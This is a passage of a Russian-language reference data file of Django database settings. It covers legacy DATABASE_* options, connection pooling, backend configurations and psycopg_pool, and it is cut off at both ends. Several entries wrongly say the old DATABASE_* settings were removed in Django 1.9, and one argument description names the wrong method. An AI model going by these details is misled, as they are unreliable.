DATABASES = {'default': {
    'PASSWORD': env('DATABASE_PASSWORD'),
}}

# Replit Secrets — управляются через UI/CLI, доступны как env-переменные
DATABASES = {'default': {
    'PASSWORD': os.environ['DATABASE_PASSWORD'],
}}

# Чек-лист безопасности:
# 1. Пароль НИКОГДА не в коде
# 2. .env / secrets.json в .gitignore
# 3. Production-пароль ≠ dev-пароль
# 4. Логирование запросов не должно показывать пароль
#    (Django по умолчанию пароли в БД не логирует, но проверьте свои middleware)
# 5. При утечке — менять немедленно, не "поправим в следующем релизе"

# Проверка, что секреты не попали в git:
# git log --all --full-history --source --remotes -p -- settings.py | grep -i password`,
  },
  {
    name: "DATABASE_PORT",
    category: "Databases",
    description:
      'Устаревшая настройка верхнего уровня (Django <1.2, удалена в 1.9). Указывала порт сервера БД. Современный эквивалент — DATABASES["default"]["PORT"]. Имя DATABASE_PORT используется как convention для переменной окружения с портом БД.',
    syntax: `# settings.py (Django <1.2, УДАЛЕНО в 1.9)
DATABASE_PORT = '5432'`,
    arguments: [],
    example: `# СТАРЫЙ синтаксис — НЕ работает в Django 1.9+
DATABASE_PORT = '5432'

# СОВРЕМЕННЫЙ эквивалент:
DATABASES = {
    'default': {
        ...,
        'PORT': '5432',
    },
}

# DATABASE_PORT как env-переменная (распространённое имя)
import os
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'PORT':   os.environ.get('DATABASE_PORT', '5432'),
}}

# Допускаются и строка, и число
'PORT': 5432         # OK
'PORT': '5432'       # OK (рекомендуется, как в env-переменных)

# Для подключения через pgbouncer:
'PORT': os.environ.get('DATABASE_PORT', '6432')      # pgbouncer default

# Heroku-style DATABASE_URL автоматически разбирается на части (включая PORT):
import dj_database_url
DATABASES = {'default': dj_database_url.config(
    default='postgres://user:pass@localhost:5432/mydb'
)}
# dj_database_url сам положит порт в DATABASES['default']['PORT']`,
  },
  {
    name: "DATABASE_OPTIONS",
    category: "Databases",
    description:
      'Устаревшая настройка верхнего уровня (Django <1.2, удалена в 1.9). Словарь опций драйвера БД. Современный эквивалент — DATABASES["default"]["OPTIONS"]. Принципиальной разницы в формате нет — сами ключи (sslmode, charset, isolation_level и пр.) остались теми же. Различие только в месте размещения внутри settings.py.',
    syntax: `# settings.py (Django <1.2, УДАЛЕНО в 1.9)
DATABASE_OPTIONS = {'sslmode': 'require'}`,
    arguments: [],
    example: `# СТАРЫЙ синтаксис — НЕ работает в Django 1.9+
DATABASE_OPTIONS = {
    'sslmode':         'require',
    'connect_timeout': 10,
}

# СОВРЕМЕННЫЙ эквивалент:
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'OPTIONS': {                              # ← переехало внутрь
            'sslmode':         'require',
            'connect_timeout': 10,
        },
    },
}

# Полная миграция со старого синтаксиса (например, проект на Django 1.1):
# Было:
DATABASE_ENGINE   = 'postgresql_psycopg2'
DATABASE_NAME     = 'mydb'
DATABASE_USER     = 'myuser'
DATABASE_PASSWORD = 'pass'
DATABASE_HOST     = 'db.example.com'
DATABASE_PORT     = '5432'
DATABASE_OPTIONS  = {'sslmode': 'require'}

# Стало:
DATABASES = {
    'default': {
        'ENGINE':   'django.db.backends.postgresql',
        'NAME':     'mydb',
        'USER':     'myuser',
        'PASSWORD': 'pass',
        'HOST':     'db.example.com',
        'PORT':     '5432',
        'OPTIONS':  {'sslmode': 'require'},
    }
}

# Если видите DATABASE_OPTIONS в современном коде — это, скорее всего,
# название переменной окружения, парсимой в settings.py:
import os, json
opts = json.loads(os.environ.get('DATABASE_OPTIONS', '{}'))
DATABASES = {'default': {
    'ENGINE':   'django.db.backends.postgresql',
    'OPTIONS': opts,
}}
# DATABASE_OPTIONS='{"sslmode":"require","connect_timeout":10}'`,
  },
  {
    name: "DATABASE_POOL",
    category: "Databases",
    description:
      'Не является стандартной настройкой Django. Имя встречается в трёх контекстах: 1) ключ "pool" внутри DATABASES[alias]["OPTIONS"] для встроенного пула соединений PostgreSQL (Django 5.1+, требует psycopg[pool]); 2) старая настройка из устаревшего пакета django-postgrespool (deprecated); 3) условное имя переменной окружения, описывающей конфигурацию пула. Современный способ — OPTIONS["pool"] с psycopg3, либо внешний pgbouncer.',
    syntax: `# settings.py — Django 5.1+ встроенный пул
DATABASES = {
    'default': {
        ...,
        'OPTIONS': {
            'pool': {'min_size': 2, 'max_size': 10, 'timeout': 10},
        },
    },
}`,
    arguments: [],
    example: `# Способ 1: встроенный пул PostgreSQL (Django 5.1+)
# Требует драйвер с поддержкой pool: pip install "psycopg[binary,pool]"
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'NAME':   'mydb',
    'OPTIONS': {
        'pool': {
            'min_size':  2,            # минимум соединений
            'max_size':  10,           # максимум
            'timeout':   10,           # секунд ждать свободное соединение
            'max_lifetime': 3600,      # максимальное время жизни коннекта
            'max_idle':     600,       # секунд простоя до закрытия
        },
    },
}}
# При наличии pool настройки CONN_MAX_AGE и CONN_HEALTH_CHECKS не используются —
# пул сам управляет жизненным циклом коннектов.

# Способ 2: True вместо словаря — пул с настройками по умолчанию
DATABASES = {'default': {
    'OPTIONS': {'pool': True},
}}

# Способ 3: внешний pgbouncer (классический подход до Django 5.1)
# nginx → gunicorn → pgbouncer → postgres
# Django подключается к pgbouncer как к обычному postgres:
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'HOST':   'pgbouncer.internal',
    'PORT':   '6432',
    'DISABLE_SERVER_SIDE_CURSORS': True,
}}

# Способ 4: историческая настройка из django-postgrespool / django-db-connection-pool
# (сторонний deprecated пакет, не использовать в новом коде):
# DATABASE_POOL_ARGS = {
#     'max_overflow': 10,
#     'pool_size':    5,
#     'recycle':      300,
# }

# Когда какой выбрать:
#   - Один Django-инстанс, простой setup → Django 5.1+ pool в OPTIONS
#   - Много Django-инстансов, sharing connection → pgbouncer (общий)
#   - AWS RDS → RDS Proxy (управляемый аналог pgbouncer)

# Накладываемые ограничения:
#   - Pool в Django 5.1+ работает только с PostgreSQL и psycopg3
#   - Async views НЕ поддерживаются текущей реализацией pool
#   - Pool несовместим с CONN_MAX_AGE (управление коннектами берёт пул)`,
  },
  {
    name: "DATABASE_USE_RETURNING_INTO",
    category: "Databases",
    description:
      'Опция Oracle-бэкенда (use_returning_into внутри DATABASES["default"]["OPTIONS"]). При True (по умолчанию) Django использует SQL-конструкцию INSERT ... RETURNING ... INTO ... для получения автогенерируемых значений (id из последовательности) одной операцией. При False Django делает дополнительный SELECT после INSERT — медленнее, но обходит баги некоторых старых версий Oracle и cx_Oracle/python-oracledb. Применима только к Oracle.',
    syntax: `# settings.py — Oracle
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.oracle',
        ...,
        'OPTIONS': {'use_returning_into': False},
    },
}`,
    arguments: [],
    example: `# По умолчанию (рекомендуется) — RETURNING INTO включён
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.oracle',
    'NAME':   'xe',
    'USER':   'myuser',
    'PASSWORD': 'mypass',
    # OPTIONS не указаны → use_returning_into = True по умолчанию
}}

# Что делает Django при use_returning_into = True (default):
#   INSERT INTO myapp_book (title, author)
#   VALUES (:1, :2)
#   RETURNING id INTO :3;
# → одна операция, новый id возвращается в bind-параметр.

# При use_returning_into = False:
#   INSERT INTO myapp_book (title, author) VALUES (:1, :2);
#   SELECT myapp_book_sq.CURRVAL FROM dual;
# → две отдельные операции. Медленнее, больше latency.

# Когда отключать (явно False):
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.oracle',
    'OPTIONS': {
        'use_returning_into': False,
    },
}}
# Полезно если:
#   - Старая версия Oracle (<11g) с багами в RETURNING INTO
#   - Старый python-oracledb / cx_Oracle с проблемами bind-переменных
#   - Триггеры BEFORE INSERT, изменяющие возвращаемое значение неожиданно

# Эта настройка работает ТОЛЬКО с Oracle backend. Для PostgreSQL/MySQL/SQLite
# она игнорируется (там автогенерируемый id возвращается своими механизмами:
# RETURNING в PostgreSQL, lastrowid в MySQL/SQLite).

# Проверить эффект — в SQL-логе:
# DEBUG=True + LOGGING для 'django.db.backends'
# С True увидите INSERT ... RETURNING ... INTO
# С False увидите INSERT ... ; SELECT ... CURRVAL`,
  },
  {
    name: "close_old_connections()",
    category: "Databases",
    description:
      "Функция django.db.close_old_connections() — закрывает все соединения с БД, чьё время жизни (CONN_MAX_AGE) истекло. Автоматически вызывается Django через сигналы request_started и request_finished для каждого HTTP-запроса. В долгоживущих процессах вне HTTP-цикла (Celery worker, кастомные management-команды, потоки фоновых задач, RQ/Dramatiq) её нужно вызывать вручную в начале каждой задачи, иначе при CONN_MAX_AGE>0 и закрытии коннекта на стороне сервера получите OperationalError. Не путать с close_connection() (одно конкретное соединение).",
    syntax: `from django.db import close_old_connections
close_old_connections()`,
    arguments: [],
    example: `from django.db import close_old_connections, connections

# 1. Где Django вызывает её сама (не нужно делать вручную)
# В django/db/__init__.py:
#   signals.request_started.connect(close_old_connections)
#   signals.request_finished.connect(close_old_connections)
# То есть при каждом HTTP-запросе — автоматически.

# 2. Celery — обязательно вручную в начале задачи
from celery import shared_task

@shared_task
def send_email(user_id):
    close_old_connections()           # очистить устаревшие коннекты
    user = User.objects.get(pk=user_id)
    send_mail(...)
    close_old_connections()           # вернуть коннекты в нормальное состояние

# Альтернатива — глобальный signal handler (один раз при старте Celery):
from celery.signals import task_prerun, task_postrun

@task_prerun.connect
def close_db_before(*args, **kwargs):
    close_old_connections()

@task_postrun.connect
def close_db_after(*args, **kwargs):
    close_old_connections()

# 3. Кастомный поток / executor
import threading
from concurrent.futures import ThreadPoolExecutor

def background_job():
    close_old_connections()           # каждый поток — свой коннект
    try:
        process_batch()
    finally:
        close_old_connections()       # отдать обратно

with ThreadPoolExecutor(max_workers=4) as ex:
    ex.submit(background_job)

# 4. Долгий цикл в management-команде
class Command(BaseCommand):
    def handle(self, *args, **options):
        while True:
            close_old_connections()    # на каждой итерации
            process_one_batch()
            time.sleep(60)

# 5. Что именно делает функция:
# for conn in connections.all():
#     conn.close_if_unusable_or_obsolete()
# Закрывается только если:
#   - время с момента создания > CONN_MAX_AGE
#   - или is_usable() вернул False
# Активные транзакции НЕ прерываются.

# Без неё в Celery:
# Воркер открыл коннект, выполнил задачу, спал 10 минут.
# PostgreSQL закрыл коннект по idle-таймауту.
# Следующая задача → OperationalError на первом запросе.`,
  },
  {
    name: "django.db.backends.postgresql",
    category: "Databases",
    description:
      'Встроенный бэкенд Django для PostgreSQL. Указывается как ENGINE = "django.db.backends.postgresql". Требует Python-драйвер: psycopg3 (рекомендуется, "psycopg[binary]") или psycopg2 ("psycopg2-binary"). Поддерживает все продвинутые возможности Django: JSONField (нативный), ArrayField, HStoreField, Full-text search (через django.contrib.postgres), оконные функции, transaction.atomic с savepoints, RETURNING, server-side cursors, transaction-level advisory locks. Версии PostgreSQL: Django 5.x требует PostgreSQL 13+.',
    syntax: `# settings.py
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'NAME':   'mydb',
        ...
    },
}`,
    arguments: [],
    example: `# Минимальная конфигурация
DATABASES = {'default': {
    'ENGINE':   'django.db.backends.postgresql',
    'NAME':     'mydb',
    'USER':     'myuser',
    'PASSWORD': 'mypass',
    'HOST':     'localhost',
    'PORT':     '5432',
}}

# Установка драйвера
# Django 5.1+ — рекомендуется psycopg3:
#   pip install "psycopg[binary]"
#   pip install "psycopg[binary,pool]"   # с пулом
# Старый драйвер:
#   pip install psycopg2-binary

# Production-конфигурация
DATABASES = {'default': {
    'ENGINE':              'django.db.backends.postgresql',
    'NAME':                env('DB_NAME'),
    'USER':                env('DB_USER'),
    'PASSWORD':            env('DB_PASSWORD'),
    'HOST':                env('DB_HOST'),
    'PORT':                env('DB_PORT', default='5432'),
    'CONN_MAX_AGE':        60,
    'CONN_HEALTH_CHECKS':  True,
    'OPTIONS': {
        'sslmode':         'require',
        'application_name': 'myapp-web',
        'options':          '-c statement_timeout=5000',
    },
}}

# Возможности, доступные ТОЛЬКО на PostgreSQL:
from django.contrib.postgres.fields import ArrayField, HStoreField
from django.db.models import JSONField  # на PG нативный jsonb

class Article(models.Model):
    tags     = ArrayField(models.CharField(max_length=50), size=10)
    metadata = HStoreField()
    config   = JSONField(default=dict)        # jsonb с GIN-индексами

# Full-text search
from django.contrib.postgres.search import SearchVector, SearchQuery
Article.objects.annotate(
    search=SearchVector('title', 'body', config='russian')
).filter(search=SearchQuery('Django', config='russian'))

# Оконные функции и CTE — работают на всех современных бэкендах,
# но на PG исторически наиболее зрелая поддержка.
from django.db.models import Window, F
from django.db.models.functions import RowNumber
Article.objects.annotate(
    rn=Window(RowNumber(), partition_by=[F('author')], order_by=F('-pub_date'))
)`,
  },
  {
    name: "django.db.backends.mysql",
    category: "Databases",
    description:
      'Встроенный бэкенд Django для MySQL и MariaDB. Указывается как ENGINE = "django.db.backends.mysql". Требует драйвер mysqlclient (C-расширение, лучшая производительность) или PyMySQL (чистый Python). Версии: Django 5.x — MySQL 8.0.11+ или MariaDB 10.5+. Особенности: charset обязательно utf8mb4 для поддержки эмодзи; STRICT_TRANS_TABLES рекомендуется для строгой типизации; нет нативного ArrayField/HStoreField; JSONField поддерживается с MySQL 5.7.8+/MariaDB 10.2+.',
    syntax: `# settings.py
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME':   'mydb',
        'OPTIONS': {'charset': 'utf8mb4'},
    },
}`,
    arguments: [],
    example: `# Минимальная конфигурация
DATABASES = {'default': {
    'ENGINE':   'django.db.backends.mysql',
    'NAME':     'mydb',
    'USER':     'myuser',
    'PASSWORD': 'mypass',
    'HOST':     'localhost',
    'PORT':     '3306',
    'OPTIONS': {
        'charset': 'utf8mb4',                         # для эмодзи и любых юникод-символов
        'init_command': "SET sql_mode='STRICT_TRANS_TABLES'",
    },
}}

# Установка драйвера
# Рекомендуется (быстрее, поддерживается командой Django):
#   pip install mysqlclient
# Чистый Python (если mysqlclient не собирается):
#   pip install PyMySQL
#   # И в начале __init__.py проекта:
#   import pymysql; pymysql.install_as_MySQLdb()

# Создание БД с правильной кодировкой:
#   CREATE DATABASE mydb
#     CHARACTER SET utf8mb4
#     COLLATE     utf8mb4_unicode_ci;

# Production-конфигурация для AWS RDS / DigitalOcean
DATABASES = {'default': {
    'ENGINE':   'django.db.backends.mysql',
    'NAME':     env('DB_NAME'),
    'USER':     env('DB_USER'),
    'PASSWORD': env('DB_PASSWORD'),
    'HOST':     env('DB_HOST'),
    'PORT':     env('DB_PORT', default='3306'),
    'CONN_MAX_AGE': 60,
    'OPTIONS': {
        'charset': 'utf8mb4',
        'init_command': "SET sql_mode='STRICT_TRANS_TABLES'",
        'ssl': {'ca': '/etc/ssl/rds-ca.pem'},
        'isolation_level': 'read committed',          # вместо REPEATABLE READ по умолчанию
        'connect_timeout': 10,
    },
}}

# Особенности MySQL по сравнению с PostgreSQL:
# - Нет ArrayField, HStoreField (только JSONField начиная с MySQL 5.7.8)
# - LIKE по умолчанию case-insensitive (зависит от collation)
# - DDL не транзакционный — миграции не откатываются автоматически при ошибке
# - REPEATABLE READ по умолчанию — не путать с PostgreSQL READ COMMITTED
# - COUNT(*) на InnoDB полная — не использует точную статистику как PG
# - GROUP BY с не-агрегатными колонками — зависит от sql_mode

# JSONField на MySQL — работает, но:
from django.db.models import JSONField
class Doc(models.Model):
    data = JSONField()
# Запросы data__key='x' работают (JSON_EXTRACT внутри),
# но без GIN-индексов — менее эффективно чем jsonb в PG.`,
  },
  {
    name: "django.db.backends.oracle",
    category: "Databases",
    description:
      'Встроенный бэкенд Django для Oracle Database. Указывается как ENGINE = "django.db.backends.oracle". Требует драйвер python-oracledb (рекомендуется, чистый Python в thin-режиме) или старый cx_Oracle. Версии: Django 5.x требует Oracle 19c+. Особенности: имена идентификаторов автоматически приводятся к UPPERCASE; CharField с empty string сохраняется как NULL (Oracle не различает их); есть лимит 30 символов на имена (до 12c) / 128 (12c+); транзакционный DDL.',
    syntax: `# settings.py
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.oracle',
        'NAME':   'host:1521/service_name',
        ...
    },
}`,
    arguments: [],
    example: `# Минимальная конфигурация
DATABASES = {'default': {
    'ENGINE':   'django.db.backends.oracle',
    'NAME':     'xe',                                    # TNS-имя из tnsnames.ora
    'USER':     'myuser',
    'PASSWORD': 'mypass',
    'HOST':     'oracle.example.com',
    'PORT':     '1521',
}}

# Альтернативно — Easy Connect (не нужен tnsnames.ora):
DATABASES = {'default': {
    'ENGINE':   'django.db.backends.oracle',
    'NAME':     'oracle.example.com:1521/XEPDB1',
    'USER':     'myuser',
    'PASSWORD': 'mypass',
}}

# Установка драйвера (Django 5.x — рекомендован python-oracledb):
#   pip install oracledb
# Старый драйвер:
#   pip install cx_Oracle      (требует Oracle Instant Client)

# python-oracledb работает в двух режимах:
#   thin (по умолчанию)  — pure Python, не требует Instant Client
#   thick                — требует Instant Client, поддерживает больше фич

# Production-конфигурация
DATABASES = {'default': {
    'ENGINE':   'django.db.backends.oracle',
    'NAME':     env('ORACLE_DSN'),
    'USER':     env('ORACLE_USER'),
    'PASSWORD': env('ORACLE_PASSWORD'),
    'CONN_MAX_AGE': 60,
    'OPTIONS': {
        'use_returning_into': True,         # быстрее INSERT с автогенерируемым id
        'threaded': True,
    },
}}

# Особенности Oracle, влияющие на код Django:
# 1. Имена идентификаторов → UPPERCASE
#    class MyModel → таблица "MYAPP_MYMODEL"
#    Django умеет это обрабатывать прозрачно.

# 2. NULL == ''
class Article(models.Model):
    title = models.CharField(max_length=200, blank=True)
    # на Oracle: пустая строка автоматически становится NULL
    # фильтр Article.objects.filter(title='') не работает —
    # нужно Article.objects.filter(title__isnull=True)

# 3. Лимит длины имён (до 30 символов в Oracle 11g/12c R1)
# Django автоматически усекает и хеширует длинные имена
# (myapp_verylongmodelname_field_xxxxx)

# 4. Транзакционный DDL — CREATE TABLE можно откатить
#    (PostgreSQL тоже умеет; MySQL — нет)

# 5. Sequences вместо AUTO_INCREMENT
#    Django создаёт <table>_SQ для каждого AutoField

# 6. CLOB вместо TEXT для длинных строк
#    TextField → CLOB (особое API для записи)`,
  },
  {
    name: "django.db.backends.sqlite3",
    category: "Databases",
    description:
      'Встроенный бэкенд Django для SQLite. Указывается как ENGINE = "django.db.backends.sqlite3". Драйвер sqlite3 встроен в стандартную библиотеку Python — отдельной установки не требует. Версии: Django 5.x требует SQLite 3.31+. Идеален для разработки, тестов, embedded-приложений и небольших production-проектов с малой нагрузкой на запись (< 100 RPS). Главное ограничение — single-writer (только один пишущий процесс одновременно); WAL-режим частично смягчает.',
    syntax: `# settings.py
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME':   BASE_DIR / 'db.sqlite3',
    },
}`,
    arguments: [],
    example: `# Минимальная конфигурация (по умолчанию для startproject)
from pathlib import Path
BASE_DIR = Path(__file__).resolve().parent.parent

DATABASES = {'default': {
    'ENGINE': 'django.db.backends.sqlite3',
    'NAME':   BASE_DIR / 'db.sqlite3',
}}

# In-memory для быстрых тестов (всё в RAM, исчезает после процесса)
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.sqlite3',
    'NAME':   ':memory:',
}}

# Production-настройка для small-scale (читающий-пишущий веб-сайт малого размера)
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.sqlite3',
    'NAME':   '/var/data/myapp.db',
    'OPTIONS': {
        'timeout': 20,                                # секунд ждать блокировку
        'init_command': '''
            PRAGMA journal_mode=WAL;
            PRAGMA synchronous=NORMAL;
            PRAGMA cache_size=-20000;                 # 20 MB cache
            PRAGMA foreign_keys=ON;
            PRAGMA temp_store=MEMORY;
            PRAGMA mmap_size=134217728;               # 128 MB
        ''',
        'transaction_mode': 'IMMEDIATE',              # Django 5.1+ — снижает SQLITE_BUSY
    },
}}

# Возможности и ограничения SQLite:
# + zero-config, один файл — легко бэкапить (cp db.sqlite3)
# + быстрые чтения (десятки тысяч SELECT/sec)
# + полная поддержка JSON1, FTS5 (full-text), R*Tree (геопространственный)
# + Window functions с SQLite 3.25+
# + RETURNING с SQLite 3.35+

# Ограничения (важно для production-выбора):
# - Single writer: при INSERT/UPDATE остальные пишущие транзакции ждут.
#   WAL смягчает: чтение не блокирует запись и наоборот, но writers всё ещё один.
# - Нет ALTER COLUMN — миграции с изменением типа делают пересоздание таблицы
# - Нет TRUE BOOLEAN (хранится как INTEGER 0/1 — Django обрабатывает прозрачно)
# - Нет NUMERIC(p,s) с фиксированной точностью (DecimalField хранится как REAL)
# - Нет встроенных пользователей/ролей — права на уровне файла
# - Нет репликации (но есть Litestream — стороннее решение для бэкапов в S3)

# Когда SQLite уместен в production:
# - Read-heavy сайты с малой записью (блог, документация, портфолио)
# - Embedded-приложения (Django как часть desktop/IoT приложения)
# - Single-process деплой (один gunicorn worker, без concurrent writes)
# - Прототипирование

# Когда НЕ использовать:
# - Многопоточные/многопроцессные writes
# - Требуется репликация / read-replicas
# - Большой объём (> 100 GB начинает быть громоздким для бэкапов)
# - Нужен ArrayField/HStoreField/нативный jsonb (всё это PostgreSQL)`,
  },
  {
    name: "django.contrib.postgres.operations.CreateExtension",
    category: "Databases",
    description:
      "Класс операции миграции для подключения расширения PostgreSQL. Эквивалент SQL-команды CREATE EXTENSION IF NOT EXISTS. Используется в файлах миграций для подключения pg_trgm (триграммный поиск), unaccent (поиск без диакритики), hstore, pgcrypto, postgis и других. Готовые подклассы: TrigramExtension, UnaccentExtension, HStoreExtension, BtreeGinExtension, BtreeGistExtension, CITextExtension, CryptoExtension, BloomExtension. Требует, чтобы пользователь БД имел право CREATE EXTENSION (обычно superuser).",
    syntax: `from django.contrib.postgres.operations import CreateExtension

class Migration(migrations.Migration):
    operations = [CreateExtension('pg_trgm')]`,
    arguments: [
      {
        name: "name",
        description:
          'Имя расширения PostgreSQL для подключения (передаётся в CREATE EXTENSION). Например: "pg_trgm", "unaccent", "hstore", "pgcrypto", "postgis", "citext".',
      },
    ],
    example: `# myapp/migrations/0002_enable_extensions.py
from django.contrib.postgres.operations import (
    CreateExtension,
    TrigramExtension,           # pg_trgm
    UnaccentExtension,          # unaccent
    HStoreExtension,            # hstore
    CITextExtension,            # citext (case-insensitive text)
    CryptoExtension,            # pgcrypto
    BtreeGinExtension,          # btree_gin
    BtreeGistExtension,         # btree_gist
    BloomExtension,             # bloom
)
from django.db import migrations

class Migration(migrations.Migration):
    dependencies = [('myapp', '0001_initial')]
    operations = [
        # Универсальный способ — для любого расширения по имени
        CreateExtension('pg_trgm'),
        CreateExtension('unaccent'),
        # Готовые подклассы — то же самое короче
        TrigramExtension(),
        UnaccentExtension(),
        HStoreExtension(),
    ]

# Зачем нужны расширения:

# 1. pg_trgm — триграммный поиск, ускоряет icontains/iregex
from django.contrib.postgres.indexes import GinIndex
from django.contrib.postgres.search import TrigramSimilarity

class Meta:
    indexes = [GinIndex(fields=['title'], name='title_trgm', opclasses=['gin_trgm_ops'])]

Article.objects.annotate(
    sim=TrigramSimilarity('title', 'джанго')
).filter(sim__gt=0.3).order_by('-sim')

# 2. unaccent — поиск без учёта диакритики
from django.contrib.postgres.lookups import Unaccent
Article.objects.annotate(
    plain=Unaccent('title')
).filter(plain__icontains='resume')   # найдёт "résumé"

# 3. hstore — словарь ключ-значение
from django.contrib.postgres.fields import HStoreField
class Product(models.Model):
    attributes = HStoreField()         # {"color": "red", "size": "L"}

# 4. pgcrypto — шифрование на стороне БД
# Используется в кастомных функциях:
# SELECT pgp_sym_encrypt('secret', 'key')

# Права на CREATE EXTENSION:
# По умолчанию требует superuser (postgres). На managed-сервисах
# (AWS RDS, Cloud SQL) есть упрощённый механизм:
#   GRANT rds_superuser TO myuser;
# или предустановленный белый список расширений.

# Альтернативы операции:
# - SeparateDatabaseAndState с RunSQL
# - Прямой psql: CREATE EXTENSION pg_trgm; (один раз, без миграции)
# - TEST.TEMPLATE с подготовленным шаблоном (для тестов)`,
  },
  {
    name: "django.db.backends.postgresql.psycopg_any.IsolationLevel",
    category: "Databases",
    description:
      'Перечисление уровней изоляции транзакций PostgreSQL для использования в DATABASES["default"]["OPTIONS"]["isolation_level"]. Доступно в Django 4.1+ и работает поверх как psycopg2, так и psycopg3 — модуль psycopg_any выбирает правильный класс автоматически. Значения: READ_UNCOMMITTED, READ_COMMITTED (по умолчанию в PG), REPEATABLE_READ, SERIALIZABLE. На уровне коннекта влияет на видимость одновременных транзакций и шанс serialization-ошибок.',
    syntax: `from django.db.backends.postgresql.psycopg_any import IsolationLevel

DATABASES = {
    'default': {
        'OPTIONS': {'isolation_level': IsolationLevel.SERIALIZABLE},
    },
}`,
    arguments: [],
    example: `# settings.py — уровень изоляции по умолчанию для всех коннектов
from django.db.backends.postgresql.psycopg_any import IsolationLevel

DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'NAME':   'mydb',
    'OPTIONS': {
        'isolation_level': IsolationLevel.SERIALIZABLE,
    },
}}

# Доступные значения и их семантика:
IsolationLevel.READ_UNCOMMITTED   # PG не имеет — приравнивается к READ_COMMITTED
IsolationLevel.READ_COMMITTED     # default PostgreSQL
IsolationLevel.REPEATABLE_READ    # snapshot на старте транзакции
IsolationLevel.SERIALIZABLE       # полная сериализация — может бросить SerializationFailure

# Почему IsolationLevel из psycopg_any, а не из psycopg/psycopg2:
# Django поддерживает оба драйвера. psycopg_any — внутренний модуль Django,
# который реэкспортирует правильный класс в зависимости от уст �новленного драйвера:
#   psycopg2.extensions.ISOLATION_LEVEL_*    (psycopg2)
#   psycopg.IsolationLevel                   (psycopg3)

# Поведение при разных уровнях:
# Сессия A:                          Сессия B:
#   BEGIN;                             BEGIN;
#   SELECT balance FROM acc WHERE id=1;
#                                      UPDATE acc SET balance=100 WHERE id=1;
#                                      COMMIT;
#   SELECT balance FROM acc WHERE id=1;

# READ COMMITTED:    A видит обновлённое значение (non-repeatable read)
# REPEATABLE READ:   A видит исходное значение, но при UPDATE → SerializationFailure
# SERIALIZABLE:      то же + дополнительная проверка predicate locks

# Ловить SerializationFailure и повторять:
from django.db import transaction
from django.db.utils import OperationalError
import time

def transfer_with_retry(sender, receiver, amount, attempts=3):
    for i in range(attempts):
        try:
            with transaction.atomic():
                a = Account.objects.select_for_update().get(pk=sender)
                b = Account.objects.select_for_update().get(pk=receiver)
                a.balance -= amount
                b.balance += amount
                a.save(); b.save()
            return
        except OperationalError as e:
            if 'could not serialize' in str(e) and i < attempts - 1:
                time.sleep(0.1 * (2 ** i))
                continue
            raise

# Точечная установка для одной транзакции (без settings)
from django.db import connection, transaction
with transaction.atomic():
    with connection.cursor() as c:
        c.execute('SET TRANSACTION ISOLATION LEVEL SERIALIZABLE')
    # ... ваши операции

# Когда какой выбрать:
#   READ_COMMITTED   — большинство веб-приложений (по умолчанию)
#   REPEATABLE_READ  — отчёты, где важна целостность срез между select'ами
#   SERIALIZABLE     — финансовые операции, инвентарь, бронирования —
#                       требует обязательного retry-механизма`,
  },
  {
    name: "psycopg_pool.ConnectionPool",
    category: "Databases",
    description:
      'Класс пула соединений из пакета psycopg-pool (поставляется отдельно: pip install "psycopg[pool]"). Управляет набором постоянно открытых соединений к PostgreSQL: новые запросы получают коннект из пула, по окончании возвращают обратно. Django 5.1+ интегрирует этот пул через DATABASES["default"]["OPTIONS"]["pool"]. Можно использовать и напрямую — для собственных скриптов, asyncio-сервисов или Celery, где Django ORM не нужен.',
    syntax: `from psycopg_pool import ConnectionPool

pool = ConnectionPool(
    'postgresql://user:pass@host:5432/db',
    min_size=2,
    max_size=10,
)`,
    arguments: [
      {
        name: "conninfo",
        description:
          'Строка подключения PostgreSQL: "postgresql://user:pass@host:port/dbname" или DSN-формат "host=... user=... dbname=...". Передаётся psycopg.connect().',
      },
      {
        name: "min_size",
        description:
          "Минимальное количество открытых соединений в пуле. Пул держит этот минимум всегда (открывает при старте). По умолчанию 4.",
      },
      {
        name: "max_size",
        description:
          "Максимальное количество соединений. При превышении get() ждёт освобождения. По умолчанию равен min_size.",
      },
      {
        name: "timeout",
        description:
          "Секунды ожидания свободного соединения, после которых poll() выбросит PoolTimeout. По умолчанию 30.",
      },
      {
        name: "max_lifetime",
        description:
          "Максимальное время жизни одного соединения в секундах. По истечении соединение пересоздаётся. По умолчанию 3600.",
      },
      {
        name: "max_idle",
        description:
          "Максимальное время простоя соединения в пуле в секундах перед закрытием (если это не нарушает min_size). По умолчанию 600.",
      },
    ],
    example: `# Установка
# pip install "psycopg[binary,pool]"

# 1. Использование в Django 5.1+ через OPTIONS["pool"]
DATABASES = {'default': {
    'ENGINE': 'django.db.backends.postgresql',
    'NAME':   'mydb',
    'OPTIONS': {
        'pool': {
            'min_size':     2,
            'max_size':     10,
            'timeout':      10,
            'max_lifetime': 3600,
            'max_idle':     600,
        },
    },
}}
# Внутри Django сам создаёт ConnectionPool на каждый алиас БД и каждый процесс.
# CONN_MAX_AGE и CONN_HEALTH_CHECKS игнорируются — пул сам управляет.

# 2. Прямое использование — отдельно от Django ORM
from psycopg_pool import ConnectionPool

pool = ConnectionPool(
    'postgresql://user:pass@db.example.com:5432/mydb',
    min_size=2,
    max_size=10,
    timeout=10,
    open=True,             # открыть пул сразу (psycopg-pool 3.2+)
)

# Получить коннект и выполнить запрос
with pool.connection() as conn:
    with conn.cursor() as cur:
        cur.execute('SELECT id, title FROM article WHERE id = %s', (123,))
        row = cur.fetchone()
        print(row)
# По выходу из with коннект автоматически возвращается в пул.

# Закрытие пула при остановке приложения
pool.close()

# 3. AsyncConnectionPool для asyncio
from psycopg_pool import AsyncConnectionPool
import asyncio

async def main():
    pool = AsyncConnectionPool('postgresql://...', min_size=2, max_size=10)
    await pool.open()
    async with pool.connection() as conn:
        async with conn.cursor() as cur:
